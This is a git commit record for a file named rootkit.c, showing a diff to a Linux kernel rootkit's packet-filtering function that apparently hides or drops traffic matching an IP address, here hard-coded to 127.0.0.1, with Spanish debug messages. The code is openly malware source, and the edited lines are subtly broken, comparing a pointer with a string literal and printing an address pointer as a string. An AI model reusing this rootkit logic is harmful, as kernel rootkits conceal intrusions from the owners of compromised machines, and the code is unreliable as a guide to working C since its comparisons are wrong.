a5227b4ac72eb953f5218e24b143261c55c28e90
Juan Schällibaum <juanschallibaum@hotmail.com>
2018-07-30 15:56:44 -0300

    Update rootkit.c

--- rootkit.c
+++ rootkit.c
@@ -932,8 +932,10 @@ int packet_check(struct sk_buff *skb)
 		if(find_packet_ipv4((u8 *)&header->saddr) 
 			|| find_packet_ipv4((u8 *)&header->daddr)) {
 		*/
-		pr_info("IP ENTRANTE: %s   IP LOCALHOST: %s\n", (u8 *)&header->daddr, *(unsigned int *)drop_ip);
-		if((u8 *)&header->saddr == *(unsigned int *)drop_ip || (u8 *)&header->daddr == *(unsigned int *)drop_ip){
+		pr_info("IP ENTRANTE: %s   IP LOCALHOST: %s\n", (u8 *)&header->daddr, "127.0.0.1");
+		
+		if((u8 *)&header->saddr == "127.0.0.1" || (u8 *)&header->daddr == "127.0.0.1"){
+			
 		//if(skb->nh.iph->saddr == *(unsigned int *)deny_ip || skb->nh.iph->daddr == *(unsigned int *)deny_ip){
 			//debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
 			pr_info("SE DETECTO 127.0.0.1 FILTRANDO\n");
